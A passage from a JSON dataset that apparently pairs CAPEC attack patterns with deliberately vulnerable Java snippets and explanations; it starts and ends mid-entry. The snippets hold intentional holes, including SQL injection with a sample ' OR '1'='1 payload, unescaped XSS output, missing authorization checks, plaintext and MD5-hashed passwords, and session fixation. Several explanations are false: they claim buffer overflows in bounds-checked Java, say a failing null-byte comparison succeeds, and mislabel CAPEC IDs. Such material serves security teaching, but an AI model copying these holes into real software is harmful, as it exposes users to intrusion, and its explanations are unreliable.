        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class VulnerableBinaryResourceHandler {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableBinaryResourceHandler <file>\");\n            return;\n        }\n\n        File file = new File(args[0]);\n        byte[] buffer = new byte[1024]; // Fixed buffer size\n\n        try (FileInputStream fis = new FileInputStream(file)) {\n            int bytesRead = fis.read(buffer);\n            while (bytesRead != -1) {\n                processBuffer(buffer, bytesRead);\n                bytesRead = fis.read(buffer);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processBuffer(byte[] buffer, int length) {\n        byte[] data = new byte[length];\n        System.arraycopy(buffer, 0, data, 0, length);\n        // Vulnerable code: processing the data without proper validation\n        // This could lead to buffer overflow if the data is not properly handled\n        System.out.println(\"Processing data: \" + new String(data));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable binary resource handler that reads a binary file (e.g., an image or music file) and processes its content. The main vulnerability lies in the fixed buffer size (1024 bytes) used to read the file. The `processBuffer` method copies the buffer content into a new byte array without proper validation, which can lead to a buffer overflow if the data is not handled correctly. This represents the CAPEC 'Overflow Binary Resource File' and related CWEs, particularly CWE-120 (Buffer Copy without Checking Size of Input) and CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer). The code also highlights the risk of processing binary data without adequate checks, potentially allowing an attacker to execute arbitrary code."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import java.io.*;\n\npublic class SymbolicLinkBufferOverflow {\n    public static void main(String[] args) {\n        try {\n            // Create a symbolic link\n            File symLink = new File(\"/tmp/symlink\");\n            File targetFile = new File(\"/tmp/target\");\n            Process p = Runtime.getRuntime().exec(\"ln -s \" + targetFile.getAbsolutePath() + \" \" + symLink.getAbsolutePath());\n            p.waitFor();\n\n            // Read from the symbolic link\n            BufferedReader reader = new BufferedReader(new FileReader(symLink));\n            char[] buffer = new char[10];\n            int charsRead = reader.read(buffer);\n\n            // Vulnerable buffer copy without size check\n            char[] vulnerableBuffer = new char[5];\n            System.arraycopy(buffer, 0, vulnerableBuffer, 0, charsRead); // CWE-120\n\n            System.out.println(\"Buffer content: \" + new String(vulnerableBuffer));\n            reader.close();\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability via symbolic links. The code creates a symbolic link pointing to a target file and then reads from the symbolic link into a buffer. The buffer content is then copied into a smaller buffer without proper size checking, leading to a potential buffer overflow (CWE-120). This example embodies the main idea of the CAPEC by showing how symbolic links can be manipulated to cause buffer overflows due to insufficient bounds checking."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\n\npublic class VulnerableConfigParser {\n    public static void main(String[] args) {\n        String filePath = \"config.txt\";\n        char[] buffer = new char[256]; // Fixed-size buffer\n        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {\n            int charsRead = br.read(buffer, 0, buffer.length);\n            if (charsRead > 0) {\n                String configData = new String(buffer, 0, charsRead);\n                System.out.println(\"Config Data: \" + configData);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration file parser that reads data from a file into a fixed-size buffer without proper validation. The buffer is defined with a fixed size of 256 characters. The code reads the content of 'config.txt' into this buffer and then converts it to a string for further processing. This example embodies the main idea of the CAPEC 'Overflow Variables and Tags' by potentially causing a buffer overflow if the configuration file contains more data than the buffer can hold. The related CWEs are represented as follows:\n- CWE-120: The code copies data from the file to the buffer without checking if the file's content exceeds the buffer size.\n- CWE-118 and CWE-119: The code does not restrict operations within the buffer's boundaries, leading to potential out-of-bounds access.\n- CWE-20: The code does not validate the input data from the file.\n- CWE-680: If the buffer size calculation were based on an integer operation, an integer overflow could lead to a buffer overflow."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "import java.util.Scanner;\n\npublic class BufferOverflowExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your name: \");\n        String input = scanner.nextLine();\n\n        // Vulnerable code: buffer overflow via parameter expansion\n        // CWE-120: Buffer Copy without Checking Size of Input\n        // CWE-131: Incorrect Calculation of Buffer Size\n        // CWE-20: Improper Input Validation\n        char[] buffer = new char[10];\n        for (int i = 0; i < input.length(); i++) {\n            buffer[i] = input.charAt(i); // No bounds checking\n        }\n\n        System.out.println(\"Hello, \" + new String(buffer));\n    }\n}",
        "description": "This Java code snippet demonstrates a buffer overflow vulnerability via parameter expansion. The program reads a user's input and attempts to copy it into a fixed-size buffer without checking if the input length exceeds the buffer size. This can lead to a buffer overflow if the input is longer than the buffer, potentially causing unexpected behavior or security issues. The code embodies the main idea of CAPEC-120, with related weaknesses such as CWE-120 (Buffer Copy without Checking Size of Input), CWE-131 (Incorrect Calculation of Buffer Size), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableFileAccess {\n    public static void main(String[] args) {\n        try {\n            String input = args[0]; // Expecting a URL\n            URL url = new URL(input);\n            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(inputLine);\n            }\n            in.close();\n        } catch (MalformedURLException e) {\n            System.err.println(\"Invalid URL format: \" + e.getMessage());\n        } catch (IOException e) {\n            System.err.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where a local file path can be passed to a function expecting a URL. The program takes an input string (expected to be a URL) from the command line arguments and attempts to open a stream to read from it. If an attacker provides a local file path (e.g., 'file:///etc/passwd'), the program will read the local file instead of a remote URL. This can lead to unauthorized access to local files and potential leakage of sensitive information. The code also highlights CWE-241 (Improper Handling of Unexpected Data Type) by not validating the input type, CWE-706 (Use of Incorrectly-Resolved Name or Reference) by resolving local file paths, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by potentially exposing sensitive data in the output."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class AuthenticationSystem {\n    private static final int MAX_ATTEMPTS = 5;\n    private Map<String, String> userDatabase = new HashMap<>();\n    private Map<String, Integer> loginAttempts = new HashMap<>();\n\n    public AuthenticationSystem() {\n        // Storing passwords in plaintext (CWE-257)\n        userDatabase.put(\"user1\", \"password123\");\n        userDatabase.put(\"user2\", \"123456\");\n    }\n\n    public boolean authenticate(String username, String password) {\n        if (!userDatabase.containsKey(username)) {\n            return false;\n        }\n\n        // Improper restriction of excessive authentication attempts (CWE-307)\n        int attempts = loginAttempts.getOrDefault(username, 0);\n        if (attempts >= MAX_ATTEMPTS) {\n            System.out.println(\"Account locked due to too many failed attempts.\");\n            return false;\n        }\n\n        if (userDatabase.get(username).equals(password)) {\n            loginAttempts.put(username, 0); // Reset attempts on successful login\n            return true;\n        } else {\n            loginAttempts.put(username, attempts + 1);\n            return false;\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationSystem authSystem = new AuthenticationSystem();\n        System.out.println(authSystem.authenticate(\"user1\", \"wrongpassword\")); // false\n        System.out.println(authSystem.authenticate(\"user1\", \"password123\")); // true\n    }\n}",
        "description": "This Java code snippet represents a simple authentication system that embodies the main idea of CAPEC-112: Password Brute Forcing. The code includes several weaknesses related to the described CWEs:\n\n1. **Weak Password Requirements (CWE-521)**: The passwords used in the user database are weak and easily guessable.\n2. **Storing Passwords in a Recoverable Format (CWE-257)**: Passwords are stored in plaintext, making them vulnerable to attacks if the database is compromised.\n3. **Improper Restriction of Excessive Authentication Attempts (CWE-307)**: The system allows up to 5 failed login attempts before locking the account, which may not be sufficient to prevent brute force attacks.\n\nThe `authenticate` method checks the provided username and password against the stored values and tracks the number of failed login attempts. If the maximum number of attempts is exceeded, the account is locked. This code demonstrates how an authentication system can be vulnerable to brute force attacks due to weak password policies, improper storage of passwords, and insufficient measures to prevent excessive authentication attempts."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\nimport java.util.Scanner;\n\npublic class PasswordRecovery {\n    private static Map<String, String> userDatabase = new HashMap<>();\n    private static Map<String, String> securityQuestions = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Initialize user database with weak password storage\n        userDatabase.put(\"user1\", \"password123\"); // CWE-257: Storing Passwords in a Recoverable Format\n        securityQuestions.put(\"user1\", \"What is your pet's name?\");\n\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter username:\");\n        String username = scanner.nextLine();\n\n        if (userDatabase.containsKey(username)) {\n            System.out.println(securityQuestions.get(username));\n            String answer = scanner.nextLine();\n\n            // Weak security question check (CWE-640: Weak Password Recovery Mechanism for Forgotten Password)\n            if (answer.equalsIgnoreCase(\"fluffy\")) {\n                System.out.println(\"Your password is: \" + userDatabase.get(username)); // CWE-522: Insufficiently Protected Credentials\n            } else {\n                System.out.println(\"Incorrect answer.\");\n            }\n        } else {\n            System.out.println(\"User not found.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a weak password recovery mechanism, embodying the main idea of CAPEC-139: Password Recovery Exploitation. The code initializes a user database with passwords stored in plaintext (CWE-257: Storing Passwords in a Recoverable Format). It then prompts the user for a username and a security question answer. If the answer matches a hardcoded value, the password is displayed in plaintext (CWE-522: Insufficiently Protected Credentials). The security question mechanism is weak and easily exploitable (CWE-640: Weak Password Recovery Mechanism for Forgotten Password). This example highlights the vulnerabilities associated with insufficiently protected credentials and weak password recovery mechanisms."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class WebServiceRegistry {\n    private Map<String, String> registry = new HashMap<>();\n\n    public void addService(String serviceName, String serviceEndpoint) {\n        // CWE-314: Storing service endpoint in cleartext\n        registry.put(serviceName, serviceEndpoint);\n    }\n\n    public String lookupService(String serviceName) {\n        // CWE-285: No authorization check\n        return registry.get(serviceName);\n    }\n\n    public void poisonRegistry(String serviceName, String maliciousEndpoint) {\n        // CWE-74: Injection vulnerability\n        registry.put(serviceName, maliciousEndpoint);\n    }\n\n    public static void main(String[] args) {\n        WebServiceRegistry registry = new WebServiceRegistry();\n        registry.addService(\"ExampleService\", \"http://example.com/service\");\n        System.out.println(\"Original Service Endpoint: \" + registry.lookupService(\"ExampleService\"));\n\n        // Poisoning the registry\n        registry.poisonRegistry(\"ExampleService\", \"http://malicious.com/service\");\n        System.out.println(\"Poisoned Service Endpoint: \" + registry.lookupService(\"ExampleService\"));\n    }\n}",
        "description": "This Java code snippet demonstrates a simple web service registry that can be poisoned. The registry stores service endpoints in cleartext (CWE-314) and lacks proper authorization checks (CWE-285). The `poisonRegistry` method allows an attacker to inject a malicious endpoint (CWE-74), redirecting service requests to a malicious server. The `main` method shows how the registry can be poisoned and the impact of such an attack. This code embodies the main idea of the CAPEC by illustrating how a poisoned registry can redirect service requests to malicious endpoints."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import java.io.*;\n\npublic class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"admin\\0password\";\n        if (isValidUser(userInput)) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static boolean isValidUser(String input) {\n        // Simulate a comparison with a stored username\n        String storedUsername = \"admin\";\n        return input.equals(storedUsername);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Embedding NULL Bytes' CAPEC. The `userInput` string contains a null byte (`\\0`) which is used to prematurely terminate the string. The `isValidUser` method compares the `userInput` with a stored username (`storedUsername`). Due to the null byte, the comparison may incorrectly succeed, granting access when it should not. This example highlights CWE-158 (Improper Neutralization of Null Byte or NUL Character) and CWE-697 (Incorrect Comparison), showing how improper handling of null bytes can lead to security issues."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "import java.io.UnsupportedEncodingException;\n\npublic class NullByteInjection {\n    public static void main(String[] args) {\n        String userInput = \"user\\0input\"; // User input with embedded null byte\n        String sanitizedInput = sanitizeInput(userInput);\n        if (isValidPath(sanitizedInput)) {\n            System.out.println(\"Valid path: \" + sanitizedInput);\n        } else {\n            System.out.println(\"Invalid path\");\n        }\n    }\n\n    public static String sanitizeInput(String input) {\n        try {\n            byte[] bytes = input.getBytes(\"UTF-8\");\n            StringBuilder sanitized = new StringBuilder();\n            for (byte b : bytes) {\n                if (b != 0) { // Improper neutralization of null byte\n                    sanitized.append((char) b);\n                }\n            }\n            return sanitized.toString();\n        } catch (UnsupportedEncodingException e) {\n            return input; // Fallback in case of encoding error\n        }\n    }\n\n    public static boolean isValidPath(String path) {\n        return path.endsWith(\"/\"); // Incorrect comparison and validation\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the 'Postfix, Null Terminate, and Backslash' CAPEC. The code takes user input that may contain an embedded null byte (\\0) and attempts to sanitize it by removing null bytes. However, the sanitization process is flawed because it does not properly neutralize the null byte, allowing it to bypass the validation check. The `isValidPath` method checks if the sanitized input ends with a slash (/), but due to the improper handling of the null byte, an attacker could manipulate the input to bypass this check. This example highlights issues related to CWE-158 (Improper Neutralization of Null Byte), CWE-172 (Encoding Error), CWE-173 (Improper Handling of Alternate Encoding), CWE-74 (Injection), CWE-20 (Improper Input Validation), CWE-697 (Incorrect Comparison), and CWE-707 (Improper Neutralization)."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Simulated malicious input\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", \"user\", \"password\");\n             Statement stmt = conn.createStatement();\n             ResultSet rs = stmt.executeQuery(query)) {\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n        } catch (SQLException e) {\n            System.err.println(\"Error: \" + e.getMessage()); // CWE-209: Generation of Error Message Containing Sensitive Information\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that is susceptible to SQL Injection (CWE-89) due to improper neutralization of special elements in the SQL query. The user input is directly concatenated into the SQL query without any sanitization, allowing an attacker to manipulate the query logic (CWE-943). Additionally, the error message generated in the catch block may expose sensitive information about the application's environment (CWE-209). The code represents the main idea of CAPEC-166, where an adversary probes the application's structure by submitting modified queries to extract information beyond what is intended."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Scanner;\n\npublic class VulnerablePasswordStorage {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        String hashedPassword = hashPassword(password);\n        System.out.println(\"Stored hashed password: \" + hashedPassword);\n    }\n\n    private static String hashPassword(String password) {\n        try {\n            MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-916: Insufficient computational effort\n            byte[] hashBytes = md.digest(password.getBytes());\n            StringBuilder sb = new StringBuilder();\n            for (byte b : hashBytes) {\n                sb.append(String.format(\"%02x\", b));\n            }\n            return sb.toString();\n        } catch (NoSuchAlgorithmException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable password storage mechanism. It reads a password from the user, hashes it using the MD5 algorithm, and prints the hashed password. The use of MD5 for hashing passwords is a key vulnerability (CWE-916) because it does not provide sufficient computational effort to make password cracking infeasible. This makes the system susceptible to rainbow table attacks, where precomputed hash chains can be used to quickly find the original password. The code also implicitly highlights other weaknesses such as reliance on single-factor authentication (CWE-308) and weak password requirements (CWE-521), as it does not enforce strong password policies or use multi-factor authentication."
    },
    {
        "capec_id": "56",
        "capec_name": "DEPRECATED: Removing/short-circuiting 'guard logic'",
        "code_snippet": "public class AuthenticationService {\n    private boolean isAuthenticated = false;\n\n    public void authenticate(String username, String password) {\n        // Simulate authentication logic\n        if (\"admin\".equals(username) && \"password123\".equals(password)) {\n            isAuthenticated = true;\n        }\n    }\n\n    public void accessSensitiveFunction() {\n        // Guard logic that should prevent unauthorized access\n        if (!isAuthenticated) {\n            System.out.println(\"Access Denied: User is not authenticated.\");\n            return;\n        }\n        System.out.println(\"Access Granted: Performing sensitive operation.\");\n    }\n\n    public static void main(String[] args) {\n        AuthenticationService authService = new AuthenticationService();\n        // Bypassing authentication by directly setting the flag\n        authService.isAuthenticated = true;\n        authService.accessSensitiveFunction();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where the guard logic for authentication can be bypassed. The `isAuthenticated` flag is directly manipulated to grant access to a sensitive function without proper authentication. This represents the main idea of CAPEC-207, where important client functionality (authentication in this case) is removed or short-circuited. The related CWEs provide additional context: CWE-287 (Authentication Bypass Issues) is shown by bypassing the authentication check, CWE-602 (Client-Side Enforcement of Server-Side Security) is illustrated by relying on a client-side flag for security, and CWE-693 (Protection Mechanism Failure) is demonstrated by the failure of the authentication mechanism to provide sufficient defense."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/sensitiveData\")\npublic class SensitiveDataServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // CWE-598: Use of GET Request Method With Sensitive Query Strings\n        String sensitiveData = request.getParameter(\"token\");\n\n        // CWE-287: Improper Authentication\n        if (sensitiveData != null && sensitiveData.equals(\"validToken\")) {\n            // CWE-642: External Control of Critical State Data\n            request.getSession().setAttribute(\"user\", \"authenticatedUser\");\n\n            // Simulate sensitive data retrieval\n            String retrievedData = \"Sensitive Information\";\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            response.getWriter().write(retrievedData);\n        } else {\n            // CWE-693: Protection Mechanism Failure\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"Unauthorized access\");\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a REST-style application that is vulnerable to several security weaknesses. The servlet processes a GET request containing a sensitive token in the query string (CWE-598). It performs improper authentication by directly comparing the token to a hardcoded value (CWE-287). If the token is valid, it sets a session attribute that can be externally controlled (CWE-642) and writes sensitive data to the response without ensuring the integrity of the communication channel (CWE-300). If the token is invalid, it sends an unauthorized error, but this mechanism is insufficient to protect against directed attacks (CWE-693). This code embodies the main idea of the CAPEC by demonstrating how trust in system resources and environment can lead to the exposure of sensitive data once SSL is terminated."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/user\")\npublic class UserServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String action = request.getParameter(\"action\");\n        String userId = request.getParameter(\"userId\");\n\n        if (\"delete\".equals(action)) {\n            // No authorization check\n            deleteUser(userId);\n            response.getWriter().write(\"User deleted\");\n        } else if (\"update\".equals(action)) {\n            // No authorization check\n            String newName = request.getParameter(\"newName\");\n            updateUser(userId, newName);\n            response.getWriter().write(\"User updated\");\n        } else {\n            response.getWriter().write(\"Invalid action\");\n        }\n    }\n\n    private void deleteUser(String userId) {\n        // Code to delete user\n    }\n\n    private void updateUser(String userId, String newName) {\n        // Code to update user\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a RESTful privilege elevation vulnerability. The servlet handles HTTP GET requests to perform actions like deleting or updating a user based on the 'action' parameter. However, it lacks proper authorization checks, allowing any user to perform these actions without verifying their privileges. This embodies the main idea of CAPEC-267, CAPEC-269, and CAPEC-285, where improper privilege management and authorization checks can lead to unauthorized actions. Additionally, it highlights CWE-650 by trusting HTTP GET methods to perform state-changing operations without proper access control."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "import java.security.SecureRandom;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class SessionManager {\n    private static final int SESSION_ID_LENGTH = 8; // CWE-6: Insufficient Session-ID Length\n    private static final SecureRandom random = new SecureRandom(); // CWE-330: Use of Insufficiently Random Values\n    private static final Map<String, String> sessions = new HashMap<>();\n\n    public static String createSession(String username) {\n        String sessionId = generateSessionId();\n        sessions.put(sessionId, username);\n        return sessionId;\n    }\n\n    private static String generateSessionId() {\n        byte[] bytes = new byte[SESSION_ID_LENGTH];\n        random.nextBytes(bytes);\n        StringBuilder sessionId = new StringBuilder();\n        for (byte b : bytes) {\n            sessionId.append(String.format(\"%02x\", b));\n        }\n        return sessionId.toString();\n    }\n\n    public static String getUser(String sessionId) {\n        return sessions.get(sessionId); // CWE-346: Origin Validation Error\n    }\n\n    public static void main(String[] args) {\n        String sessionId = createSession(\"user1\");\n        System.out.println(\"Session ID: \" + sessionId);\n        System.out.println(\"User: \" + getUser(sessionId));\n    }\n}",
        "description": "This Java code snippet demonstrates a simple session management system that is vulnerable to 'Session Credential Falsification through Prediction' (CAPEC). The session IDs are generated using a fixed length (CWE-6) and a SecureRandom instance (CWE-330), but the length of the session ID is insufficient, making it easier to predict. The 'getUser' method retrieves the username associated with a session ID without proper validation (CWE-346), allowing an attacker to potentially hijack sessions by predicting or guessing session IDs. This code highlights the importance of using sufficiently long and random session IDs and validating the origin of session requests to prevent session hijacking and spoofing attacks."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Retrieve session ID from request\n        String sessionId = request.getParameter(\"sessionId\");\n        HttpSession session = request.getSession(false);\n\n        // Check if session exists\n        if (session == null) {\n            // Create a new session with the provided session ID\n            session = request.getSession(true);\n            session.setAttribute(\"sessionId\", sessionId);\n        }\n\n        // Simulate sensitive operation\n        String sensitiveData = (String) session.getAttribute(\"sensitiveData\");\n        if (sensitiveData == null) {\n            sensitiveData = \"Sensitive Information\";\n            session.setAttribute(\"sensitiveData\", sensitiveData);\n        }\n\n        // Output sensitive data\n        response.getWriter().println(\"Sensitive Data: \" + sensitiveData);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to session replay attacks. The servlet retrieves a session ID from the request parameters and either reuses an existing session or creates a new session with the provided session ID. This approach is vulnerable to session replay attacks because an attacker can capture and reuse a valid session ID to gain unauthorized access to sensitive information. The code also fails to properly validate the origin of the session ID and does not invalidate existing sessions, leading to potential session fixation and exposure of sensitive data to unauthorized actors. This snippet embodies the main idea of CAPEC-139 (Reusing Session IDs) and highlights related CWEs such as CWE-294 (Authentication Bypass by Capture-replay), CWE-384 (Session Fixation), and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class VulnerableSessionFixationServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String sessionId = request.getParameter(\"sessionId\");\n        HttpSession session = request.getSession(false);\n        if (session == null) {\n            session = request.getSession(true);\n            session.setAttribute(\"sessionId\", sessionId);\n        }\n\n        // Simulate user authentication\n        String username = request.getParameter(\"username\");\n        String password = request.getParameter(\"password\");\n        if (authenticateUser(username, password)) {\n            session.setAttribute(\"user\", username);\n            response.getWriter().println(\"User authenticated with session ID: \" + session.getId());\n        } else {\n            response.getWriter().println(\"Authentication failed.\");\n        }\n    }\n\n    private boolean authenticateUser(String username, String password) {\n        // Dummy authentication logic\n        return \"admin\".equals(username) && \"password\".equals(password);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a session fixation vulnerability. The attacker can provide a session ID via a request parameter, which the server then uses to create or reuse a session. If the user successfully authenticates, the session ID remains the same, allowing the attacker to hijack the session. This code embodies the main idea of CAPEC-384 (Session Fixation) and is related to CWE-384 (Session Fixation), CWE-664 (Improper Control of a Resource Through its Lifetime), and CWE-602 (Client-Side Enforcement of Server-Side Security). The code does not invalidate the session ID upon authentication, which is a critical security flaw."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\n\npublic class TransferFundsServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        HttpSession session = request.getSession(false);\n        if (session == null || session.getAttribute(\"user\") == null) {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"User not authenticated\");\n            return;\n        }\n\n        String amount = request.getParameter(\"amount\");\n        String account = request.getParameter(\"account\");\n\n        // Missing CSRF token validation\n        // Vulnerable to CSRF attack\n        transferFunds(account, amount);\n\n        response.getWriter().write(\"Funds transferred successfully\");\n    }\n\n    private void transferFunds(String account, String amount) {\n        // Logic to transfer funds\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross-Site Request Forgery (CSRF) vulnerability. The `TransferFundsServlet` handles POST requests to transfer funds between accounts. It checks if the user is authenticated by verifying the session, but it does not include any CSRF token validation. This omission allows an attacker to craft a malicious request that can be executed with the user's session, leading to unauthorized fund transfers. The code also highlights CWE-352 (CSRF), CWE-306 (Missing Authentication for Critical Function), and CWE-1275 (Sensitive Cookie with Improper SameSite Attribute) by showing the lack of proper request validation and session management."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class XSSVulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<h1>Welcome, \" + userInput + \"</h1>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability. The servlet takes user input from an HTTP GET request parameter named 'input' and directly includes it in the HTML response without any validation or sanitization. This allows an attacker to inject malicious scripts into the web page, which will be executed by the browser with the user's privileges. The code embodies the main idea of CAPEC-79 (Cross-Site Scripting) and highlights related CWEs such as CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-20 (Improper Input Validation), and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.net.URLDecoder;\n\n@WebServlet(\"/secure/*\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String path = request.getPathInfo();\n        if (path != null) {\n            // Decode the URL-encoded path\n            String decodedPath = URLDecoder.decode(path, \"UTF-8\");\n\n            // Check if the path is trying to access restricted directory\n            if (decodedPath.contains(\"..\")) {\n                response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n                return;\n            }\n\n            // Process the request\n            response.getWriter().println(\"Accessing: \" + decodedPath);\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"Path not found\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where URL encoding and decoding are improperly handled, leading to potential security issues such as path traversal. The servlet decodes the URL-encoded path using `URLDecoder.decode` and checks for the presence of \"..\" to prevent directory traversal. However, this simplistic check can be bypassed by using double URL encoding or other encoding schemes, allowing an attacker to access restricted directories. This code snippet embodies the main idea of CAPEC-177, CAPEC-173, and CAPEC-22 by showing how improper handling of URL encoding and path validation can lead to security vulnerabilities."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
